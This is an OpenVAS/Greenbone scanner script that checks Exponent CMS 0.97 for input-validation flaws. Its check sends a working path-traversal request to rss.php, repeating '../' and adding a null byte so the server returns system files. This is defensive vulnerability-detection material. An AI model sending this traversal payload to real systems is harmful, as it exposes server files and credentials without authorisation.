CPE = "cpe:/a:exponentcms:exponent_cms";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100938" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_bugtraq_id( 44095 );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-12-09 13:44:03 +0100 (Thu, 09 Dec 2010)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "Exponent CMS Multiple Input Validation Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "gb_exponet_cms_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "ExponentCMS/installed" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/44095" );
	script_xref( name: "URL", value: "http://www.exponentcms.org" );
	script_xref( name: "URL", value: "http://www.htbridge.ch/advisory/lfi_in_exponent_cms.html" );
	script_xref( name: "URL", value: "http://www.htbridge.ch/advisory/lfi_in_exponent_cms_1.html" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/515075" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/515076" );
	script_tag( name: "summary", value: "Exponent CMS is prone to multiple input-validation vulnerabilities
  because it fails to adequately sanitize user-supplied input. These vulnerabilities include local
  file-include, information-disclosure, arbitrary-file-upload, arbitrary-file-modify, and cross-site-scripting
  vulnerabilities." );
	script_tag( name: "impact", value: "Exploiting these issues can allow an attacker to steal cookie-based
  authentication credentials, view and execute local files within the context of the webserver, upload
  arbitrary code and run it in the context of the webserver process, compromise the application, access
  or modify data, or exploit latent vulnerabilities in the underlying database. Other attacks may also be possible." );
	script_tag( name: "affected", value: "Exponent CMS 0.97 is vulnerable. Other versions may also be affected." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/rss.php?module=" + crap( data: "../", length: 3 * 9 ) + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

